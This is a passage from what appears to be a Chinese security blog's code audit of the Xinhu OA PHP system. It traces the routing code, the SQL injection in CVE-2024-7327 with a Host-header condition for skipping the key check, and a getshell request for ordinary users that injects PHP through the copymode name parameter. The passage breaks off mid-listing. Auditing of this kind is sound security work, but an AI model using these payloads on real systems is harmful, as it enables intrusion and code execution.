class="variable">$ajaxbool</span>);</span><br><span class="line"><span class="variable">$p</span>= PROJECT;</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$m</span>))<span class="variable">$m</span>=<span class="string">&#x27;index&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$a</span>))<span class="variable">$a</span>=<span class="string">&#x27;default&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$d</span>))<span class="variable">$d</span>=<span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="variable">$m</span>= <span class="variable">$rock</span>-&gt;<span class="title function_ invoke__">get</span>(<span class="string">&#x27;m&#x27;</span>, <span class="variable">$m</span>);</span><br><span class="line"><span class="variable">$a</span>= <span class="variable">$rock</span>-&gt;<span class="title function_ invoke__">get</span>(<span class="string">&#x27;a&#x27;</span>, <span class="variable">$a</span>);</span><br><span class="line"><span class="variable">$d</span>= <span class="variable">$rock</span>-&gt;<span class="title function_ invoke__">get</span>(<span class="string">&#x27;d&#x27;</span>, <span class="variable">$d</span>);</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">define</span>(<span class="string">&#x27;M&#x27;</span>, <span class="variable">$m</span>);</span><br><span class="line"><span class="title function_ invoke__">define</span>(<span class="string">&#x27;A&#x27;</span>, <span class="variable">$a</span>);</span><br><span class="line"><span class="title function_ invoke__">define</span>(<span class="string">&#x27;D&#x27;</span>, <span class="variable">$d</span>);</span><br><span class="line"><span class="title function_ invoke__">define</span>(<span class="string">&#x27;P&#x27;</span>, <span class="variable">$p</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$_m</span>= <span class="variable">$m</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$rock</span>-&gt;<span class="title function_ invoke__">contain</span>(<span class="variable">$m</span>, <span class="string">&#x27;|&#x27;</span>))&#123;</span><br><span class="line"><span class="variable">$_mas</span> = <span class="title function_ invoke__">explode</span>(<span class="string">&#x27;|&#x27;</span>, <span class="variable">$m</span>);</span><br><span class="line"><span class="variable">$m</span> = <span class="variable">$_mas</span>[<span class="number">0</span>];</span><br><span class="line"><span class="variable">$_m</span>= <span class="variable">$_mas</span>[<span class="number">1</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">include_once</span>(<span class="variable">$rock</span>-&gt;<span class="title function_ invoke__">strformat</span>(<span class="string">&#x27;?0/?1/?1Action.php&#x27;</span>,ROOT_PATH, <span class="variable">$p</span>));</span><br><span class="line"><span class="variable">$rand</span>= <span class="title function_ invoke__">date</span>(<span class="string">&#x27;YmdHis&#x27;</span>).<span class="title function_ invoke__">rand</span>(<span class="number">1000</span>,<span class="number">9999</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">substr</span>(<span class="variable">$d</span>,-<span class="number">1</span>)!=<span class="string">&#x27;/&#x27;</span> &amp;&amp; <span class="variable">$d</span>!=<span class="string">&#x27;&#x27;</span>)<span class="variable">$d</span>.=<span class="string">&#x27;/&#x27;</span>;</span><br><span class="line"><span class="variable">$errormsg</span>= <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="variable">$methodbool</span>= <span class="literal">true</span>;</span><br><span class="line"><span class="variable">$actpath</span>= <span class="variable">$rock</span>-&gt;<span class="title function_ invoke__">strformat</span>(<span class="string">&#x27;?0/?1/?2?3&#x27;</span>,ROOT_PATH, <span class="variable">$p</span>, <span class="variable">$d</span>, <span class="variable">$_m</span>);</span><br><span class="line"><span class="title function_ invoke__">define</span>(<span class="string">&#x27;ACTPATH&#x27;</span>, <span class="variable">$actpath</span>);</span><br><span class="line"><span class="variable">$actfile</span>= <span class="variable">$rock</span>-&gt;<span class="title function_ invoke__">strformat</span>(<span class="string">&#x27;?0/?1Action.php&#x27;</span>,<span class="variable">$actpath</span>, <span class="variable">$m</span>);</span><br><span class="line"><span class="variable">$actfile1</span>= <span class="variable">$rock</span>-&gt;<span class="title function_ invoke__">strformat</span>(<span class="string">&#x27;?0/?1Action.php&#x27;</span>,<span class="variable">$actpath</span>, <span class="variable">$_m</span>);</span><br><span class="line"><span class="variable">$actbstr</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">file_exists</span>(<span class="variable">$actfile1</span>))<span class="keyword">include_once</span>(<span class="variable">$actfile1</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">file_exists</span>(<span class="variable">$actfile</span>))&#123;</span><br><span class="line"><span class="keyword">include_once</span>(<span class="variable">$actfile</span>);</span><br><span class="line"><span class="variable">$clsname</span>= <span class="string">&#x27;&#x27;</span>.<span class="variable">$m</span>.<span class="string">&#x27;ClassAction&#x27;</span>;</span><br><span class="line"><span class="variable">$xhrock</span>= <span class="keyword">new</span> <span class="variable">$clsname</span>();</span><br><span class="line"><span class="variable">$actname</span>= <span class="string">&#x27;&#x27;</span>.<span class="variable">$a</span>.<span class="string">&#x27;Action&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$ajaxbool</span> == <span class="string">&#x27;true&#x27;</span>)<span class="variable">$actname</span>= <span class="string">&#x27;&#x27;</span>.<span class="variable">$a</span>.<span class="string">&#x27;Ajax&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">method_exists</span>(<span class="variable">$xhrock</span>, <span class="variable">$actname</span>))&#123;</span><br><span class="line"><span class="variable">$xhrock</span>-&gt;<span class="title function_ invoke__">beforeAction</span>();</span><br><span class="line"><span class="variable">$actbstr</span> = <span class="variable">$xhrock</span>-&gt;<span class="variable">$actname</span>();</span><br><span class="line"><span class="variable">$xhrock</span>-&gt;bodyMessage = <span class="variable">$actbstr</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">is_string</span>(<span class="variable">$actbstr</span>))&#123;<span class="keyword">echo</span> <span class="variable">$actbstr</span>;<span class="variable">$xhrock</span>-&gt;display=<span class="literal">false</span>;&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">is_array</span>(<span class="variable">$actbstr</span>))&#123;<span class="keyword">echo</span> <span class="title function_ invoke__">json_encode</span>(<span class="variable">$actbstr</span>);<span class="variable">$xhrock</span>-&gt;display=<span class="literal">false</span>;&#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="variable">$methodbool</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$ajaxbool</span> == <span class="string">&#x27;false&#x27;</span>)<span class="keyword">echo</span> <span class="string">&#x27;&#x27;</span>.<span class="variable">$actname</span>.<span class="string">&#x27; not found;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$xhrock</span>-&gt;<span class="title function_ invoke__">afterAction</span>();</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;actionfile not exists;&#x27;</span>;</span><br><span class="line"><span class="variable">$xhrock</span>= <span class="keyword">new</span> <span class="title class_">Action</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$_showbool</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$xhrock</span>-&gt;display &amp;&amp; (<span class="variable">$ajaxbool</span> == <span class="string">&#x27;html&#x27;</span> || <span class="variable">$ajaxbool</span> == <span class="string">&#x27;false&#x27;</span>))&#123;</span><br><span class="line"><span class="variable">$xhrock</span>-&gt;smartydata[<span class="string">&#x27;p&#x27;</span>]= <span class="variable">$p</span>;</span><br><span class="line"><span class="variable">$xhrock</span>-&gt;smartydata[<span class="string">&#x27;a&#x27;</span>]= <span class="variable">$a</span>;</span><br><span class="line"><span class="variable">$xhrock</span>-&gt;smartydata[<span class="string">&#x27;m&#x27;</span>]= <span class="variable">$m</span>;</span><br><span class="line"><span class="variable">$xhrock</span>-&gt;smartydata[<span class="string">&#x27;d&#x27;</span>]= <span class="variable">$d</span>;</span><br><span class="line"><span class="variable">$xhrock</span>-&gt;smartydata[<span class="string">&#x27;rand&#x27;</span>]= <span class="variable">$rand</span>;</span><br><span class="line"><span class="variable">$xhrock</span>-&gt;smartydata[<span class="string">&#x27;qom&#x27;</span>]= QOM;</span><br><span class="line"><span class="variable">$xhrock</span>-&gt;smartydata[<span class="string">&#x27;path&#x27;</span>]= PATH;</span><br><span class="line"><span class="variable">$xhrock</span>-&gt;smartydata[<span class="string">&#x27;sysurl&#x27;</span>]= SYSURL;</span><br><span class="line"><span class="variable">$temppath</span>= <span class="string">&#x27;&#x27;</span>.ROOT_PATH.<span class="string">&#x27;/&#x27;</span>.<span class="variable">$p</span>.<span class="string">&#x27;/&#x27;</span>;</span><br><span class="line"><span class="variable">$tplpaths</span>= <span class="string">&#x27;&#x27;</span>.<span class="variable">$temppath</span>.<span class="string">&#x27;&#x27;</span>.<span class="variable">$d</span>.<span class="string">&#x27;&#x27;</span>.<span class="variable">$m</span>.<span class="string">&#x27;/&#x27;</span>;</span><br><span class="line"><span class="variable">$tplname</span>= <span class="string">&#x27;tpl_&#x27;</span>.<span class="variable">$m</span>.<span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$a</span>!=<span class="string">&#x27;default&#x27;</span>)<span class="variable">$tplname</span>  .= <span class="string">&#x27;_&#x27;</span>.<span class="variable">$a</span>.<span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="variable">$tplname</span>   .= <span class="string">&#x27;.&#x27;</span>.<span class="variable">$xhrock</span>-&gt;tpldom.<span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="variable">$mpathname</span>= <span class="variable">$tplpaths</span>.<span class="variable">$tplname</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$xhrock</span>-&gt;displayfile!=<span class="string">&#x27;&#x27;</span> &amp;&amp; <span class="title function_ invoke__">file_exists</span>(<span class="variable">$xhrock</span>-&gt;displayfile))<span class="variable">$mpathname</span> = <span class="variable">$xhrock</span>-&gt;displayfile;</span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">file_exists</span>(<span class="variable">$mpathname</span>) || !<span class="variable">$methodbool</span>)&#123;</span><br><span class="line"><span class="keyword">if</span>(!<span class="variable">$methodbool</span>)&#123;</span><br><span class="line"><span class="variable">$errormsg</span>= <span class="string">&#x27;in (&#x27;</span>.<span class="variable">$m</span>.<span class="string">&#x27;) not found Method(&#x27;</span>.<span class="variable">$a</span>.<span class="string">&#x27;);&#x27;</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="variable">$errormsg</span>= <span class="string">&#x27;&#x27;</span>.<span class="variable">$tplname</span>.<span class="string">&#x27; not exists;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$errormsg</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="variable">$_showbool</span> = <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$xhrock</span>-&gt;display &amp;&amp; (<span class="variable">$ajaxbool</span> == <span class="string">&#x27;html&#x27;</span> || <span class="variable">$xhrock</span>-&gt;tpltype==<span class="string">&#x27;html&#x27;</span> || <span class="variable">$ajaxbool</span> == <span class="string">&#x27;false&#x27;</span>) &amp;&amp; <span class="variable">$_showbool</span>)&#123;</span><br><span class="line"><span class="variable">$xhrock</span>-&gt;<span class="title function_ invoke__">setHtmlData</span>();</span><br><span class="line"><span class="variable">$da</span> = <span class="variable">$xhrock</span>-&gt;smartydata;</span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$xhrock</span>-&gt;assigndata <span class="keyword">as</span> <span class="variable">$_k</span>=&gt;<span class="variable">$_v</span>)<span class="variable">$$_k</span>=<span class="variable">$_v</span>;</span><br><span class="line"><span class="keyword">include_once</span>(<span class="variable">$mpathname</span>);</span><br><span class="line"><span class="variable">$_showbool</span> = <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>用于动态加载和执行 Web 应用的行动 (action) 脚本，处理 AJAX 请求，并动态加载视图模板。代码涵盖了从初始化变量、确定执行哪个控制器的哪个动作，到加载相应的 PHP 文件，以及处理和输出响应。</p><p>ok了 明白架构模式了 也知道了具体是怎么拼接的了 对于下面的请求：<br><code>POST /index.php?a=check&amp;m=login&amp;d=&amp;ajaxbool=true&amp;rnd=469139 </code><br>访问的是 loginClassAction 的 checkAction 方法，并且是异步请求。</p><h2 id="随便找个功能点"><a href="#随便找个功能点" class="headerlink" title="随便找个功能点"></a>随便找个功能点</h2><p><img src="/2024/10/03/WebSecurity/codeaudit/xinhuoaaudit/image-2.png"><br>修改密码的点，跟进去</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">editpassAction</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">getconfig</span>(<span class="string">&#x27;systype&#x27;</span>)==<span class="string">&#x27;demo&#x27;</span>)<span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">showreturn</span>(<span class="string">&#x27;演示上不要修改&#x27;</span>);</span><br><span class="line"><span class="variable">$id</span>= <span class="variable language_">$this</span>-&gt;adminid;</span><br><span class="line"><span class="variable">$oldpass</span>= <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">post</span>(<span class="string">&#x27;passoldPost&#x27;</span>);</span><br><span class="line"><span class="variable">$pasword</span>= <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">post</span>(<span class="string">&#x27;passwordPost&#x27;</span>);</span><br><span class="line"><span class="variable">$msg</span>= <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">isempt</span>(<span class="variable">$pasword</span>))<span class="variable">$msg</span> =<span class="string">&#x27;新密码不能为空&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$msg</span> == <span class="string">&#x27;&#x27;</span>)&#123;</span><br><span class="line"><span class="variable">$oldpassa</span>= <span class="variable language_">$this</span>-&gt;db-&gt;<span class="title function_ invoke__">getmou</span>(<span class="variable">$this</span>-&gt;<span class="title function_ invoke__">T</span>(<span class="string">&#x27;admin&#x27;</span>),<span class="string">&quot;`pass`&quot;</span>,<span class="string">&quot;`id`=&#x27;<span class="subst">$id</span>&#x27;&quot;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$oldpassa</span> != <span class="title function_ invoke__">md5</span>(<span class="variable">$oldpass</span>))<span class="variable">$msg</span> =<span class="string">&#x27;旧密码不正确&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$msg</span>==<span class="string">&#x27;&#x27;</span>)&#123;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$oldpassa</span> == <span class="title function_ invoke__">md5</span>(<span class="variable">$pasword</span>))<span class="variable">$msg</span> =<span class="string">&#x27;新旧密码不能相同&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$msg</span> == <span class="string">&#x27;&#x27;</span>)&#123;</span><br><span class="line"><span class="keyword">if</span>(!<span class="variable language_">$this</span>-&gt;db-&gt;<span class="title function_ invoke__">record</span>(<span class="variable">$this</span>-&gt;<span class="title function_ invoke__">T</span>(<span class="string">&#x27;admin&#x27;</span>), <span class="string">&quot;`pass`=&#x27;&quot;</span>.<span class="title function_ invoke__">md5</span>(<span class="variable">$pasword</span>).<span class="string">&quot;&#x27;,`editpass`=`editpass`+1&quot;</span>, <span class="string">&quot;`id`=&#x27;<span class="subst">$id</span>&#x27;&quot;</span>))<span class="variable">$msg</span>= <span class="variable language_">$this</span>-&gt;db-&gt;<span class="title function_ invoke__">error</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$msg</span>==<span class="string">&#x27;&#x27;</span>)&#123;</span><br><span class="line"><span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">showreturn</span>(<span class="string">&#x27;success&#x27;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">showreturn</span>(<span class="string">&#x27;&#x27;</span>,<span class="variable">$msg</span>, <span class="number">201</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>好像没啥能利用的，主要是输入直接被md5了<br>再多测测看</p><h2 id="CVE-2024-7327"><a href="#CVE-2024-7327" class="headerlink" title="CVE-2024-7327"></a>CVE-2024-7327</h2><p>还得是公开cve<br>在信呼OA系统2.6.2版本的&#x2F;webmain&#x2F;task&#x2F;openapi&#x2F;openmodhetongAction.php文件中，存在一个前台SQL注入漏洞。当$nickName变量经过base64解码后被加入到uarr数组中，并最终传递给$db-&gt;record()方法进行SQL查询时，攻击者可以利用此漏洞进行SQL注入攻击。此外，还需要注意父类openapiAction.php中的init方法</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">dataAction</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$mobile</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">get</span>(<span class="string">&#x27;mobile&#x27;</span>);</span><br><span class="line">    <span class="variable">$xcytype</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">get</span>(<span class="string">&#x27;xcytype&#x27;</span>);</span><br><span class="line">    <span class="variable">$openid</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">get</span>(<span class="string">&#x27;openid&#x27;</span>);</span><br><span class="line">    <span class="variable">$nickName</span> = <span class="variable language_">$this</span>-&gt;jm-&gt;<span class="title function_ invoke__">base64decode</span>(<span class="variable">$this</span>-&gt;<span class="title function_ invoke__">get</span>(<span class="string">&#x27;nickName&#x27;</span>));</span><br><span class="line">    <span class="variable">$htdata</span> = <span class="keyword">array</span>();</span><br><span class="line">    <span class="variable">$db</span>   = <span class="title function_ invoke__">m</span>(<span class="string">&#x27;wxxcyus&#x27;</span>);</span><br><span class="line">    <span class="variable">$uarr</span>[<span class="string">&#x27;mobile&#x27;</span>]   = <span class="variable">$mobile</span>;</span><br><span class="line">    <span class="variable">$uarr</span>[<span class="string">&#x27;xcytype&#x27;</span>]   = <span class="variable">$xcytype</span>;</span><br><span class="line">    <span class="variable">$uarr</span>[<span class="string">&#x27;openid&#x27;</span>]   = <span class="variable">$openid</span>;</span><br><span class="line">    <span class="variable">$uarr</span>[<span class="string">&#x27;nickName&#x27;</span>]   = <span class="variable">$nickName</span>;</span><br><span class="line">    <span class="variable">$uarr</span>[<span class="string">&#x27;province&#x27;</span>]   = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">get</span>(<span class="string">&#x27;province&#x27;</span>);</span><br><span class="line">    <span class="variable">$uarr</span>[<span class="string">&#x27;city&#x27;</span>]     = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">get</span>(<span class="string">&#x27;city&#x27;</span>);</span><br><span class="line">    <span class="variable">$uarr</span>[<span class="string">&#x27;gender&#x27;</span>]   = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">get</span>(<span class="string">&#x27;gender&#x27;</span>);</span><br><span class="line">    <span class="variable">$uarr</span>[<span class="string">&#x27;dingyue&#x27;</span>]   = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">get</span>(<span class="string">&#x27;dingyue&#x27;</span>);</span><br><span class="line">    <span class="variable">$uarr</span>[<span class="string">&#x27;avatarUrl&#x27;</span>]   = <span class="variable language_">$this</span>-&gt;jm-&gt;<span class="title function_ invoke__">base64decode</span>(<span class="variable">$this</span>-&gt;<span class="title function_ invoke__">get</span>(<span class="string">&#x27;avatarUrl&#x27;</span>));</span><br><span class="line">    <span class="variable">$where</span> = <span class="string">&quot;`openid`=&#x27;<span class="subst">$openid</span>&#x27;&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$db</span>-&gt;<span class="title function_ invoke__">rows</span>(<span class="variable">$where</span>)==<span class="number">0</span>)&#123;</span><br><span class="line">      <span class="variable">$uarr</span>[<span class="string">&#x27;adddt&#x27;</span>] = <span class="variable language_">$this</span>-&gt;now;</span><br><span class="line">      <span class="variable">$where</span>=<span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">      <span class="variable">$uarr</span>[<span class="string">&#x27;optdt&#x27;</span>] = <span class="variable language_">$this</span>-&gt;now;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$db</span>-&gt;<span class="title function_ invoke__">record</span>(<span class="variable">$uarr</span>, <span class="variable">$where</span>);</span><br></pre></td></tr></table></figure><p>跟进该方法 &#x2F;include&#x2F;Model.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">record</span>(<span class="params"><span class="variable">$arr</span>, <span class="variable">$where</span>=<span class="string">&#x27;&#x27;</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">   <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;db-&gt;<span class="title function_ invoke__">record</span>(<span class="variable">$this</span>-&gt;table, <span class="variable">$arr</span>, <span class="variable">$where</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>到了 &#x2F;include&#x2F;class&#x2F;mysql.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">record</span>(<span class="params"><span class="variable">$table</span>,<span class="variable">$array</span>,<span class="variable">$where</span>=<span class="string">&#x27;&#x27;</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$addbool</span>    = <span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">isempt</span>(<span class="variable">$where</span>))<span class="variable">$addbool</span>=<span class="literal">false</span>;</span><br><span class="line">    <span class="variable">$cont</span>    = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">is_array</span>(<span class="variable">$array</span>))&#123;</span><br><span class="line">      <span class="keyword">foreach</span>(<span class="variable">$array</span> <span class="keyword">as</span> <span class="variable">$key</span>=&gt;<span class="variable">$val</span>)&#123;</span><br><span class="line">        <span class="variable">$cont</span>.=<span class="string">&quot;,`<span class="subst">$key</span>`=&quot;</span>.<span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">toaddval</span>(<span class="variable">$val</span>).<span class="string">&quot;&quot;</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="variable">$cont</span>  = <span class="title function_ invoke__">substr</span>(<span class="variable">$cont</span>,<span class="number">1</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">      <span class="variable">$cont</span>  = <span class="variable">$array</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$table</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">gettables</span>(<span class="variable">$table</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$addbool</span>)&#123;</span><br><span class="line">      <span class="variable">$sql</span>=<span class="string">&quot;insert into <span class="subst">$table</span> set <span class="subst">$cont</span>&quot;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">      <span class="variable">$where</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">getwhere</span>(<span class="variable">$where</span>);</span><br><span class="line">      <span class="variable">$sql</span>=<span class="string">&quot;update <span class="subst">$table</span> set <span class="subst">$cont</span> where <span class="subst">$where</span>&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">tranbegin</span>(<span class="variable">$sql</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在这里带入SQL语句查询 导致注入 同时还要注意下父类openapiAction.php中的init方法 这里的Host需要属于127.0.0.1 或 192.168.x.x 的范围.</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">initAction</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable language_">$this</span>-&gt;display= <span class="literal">false</span>;</span><br><span class="line">    <span class="variable">$openkey</span>     = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">post</span>(<span class="string">&#x27;openkey&#x27;</span>);</span><br><span class="line">    <span class="variable language_">$this</span>-&gt;openkey   = <span class="title function_ invoke__">getconfig</span>(<span class="string">&#x27;openkey&#x27;</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;keycheck &amp;&amp; HOST != <span class="string">&#x27;127.0.0.1&#x27;</span> &amp;&amp; !<span class="title function_ invoke__">contain</span>(HOST,<span class="string">&#x27;192.168&#x27;</span>) &amp;&amp; <span class="variable language_">$this</span>-&gt;openkey != <span class="string">&#x27;&#x27;</span>)&#123;</span><br><span class="line">      <span class="keyword">if</span>(<span class="variable">$openkey</span> != <span class="title function_ invoke__">md5</span>(<span class="variable">$this</span>-&gt;openkey))<span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">showreturn</span>(<span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;openkey not access&#x27;</span>, <span class="number">201</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">getpostdata</span>();</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><h2 id="信呼OA普通用户权限getshell"><a href="#信呼OA普通用户权限getshell" class="headerlink" title="信呼OA普通用户权限getshell"></a>信呼OA普通用户权限getshell</h2><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">index.php?d=main&amp;m=flow&amp;a=copymode&amp;ajaxbool=true</span><br><span class="line">POST:</span><br><span class="line">id=1&amp;name=a&#123;&#125;;phpinfo ();class a</span><br><span class="line"></span><br><span class="line">生成的文件：/webmain/flow/input/mode_a%7B%7D%3Bphpinfo%20%28%29%3Bclass%20aAction.php</span><br><span class="line">/webmain/model/flow/2%7B%7D%3Bphpinfo%20%28%29%3Bclass%20aModel.php</span><br><span class="line"></span><br><span class="line">其实是</span><br><span class="line">![](xinhuoaaudit/image-3.png)</span><br></pre></td></tr></table></figure><p>代码分析：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span 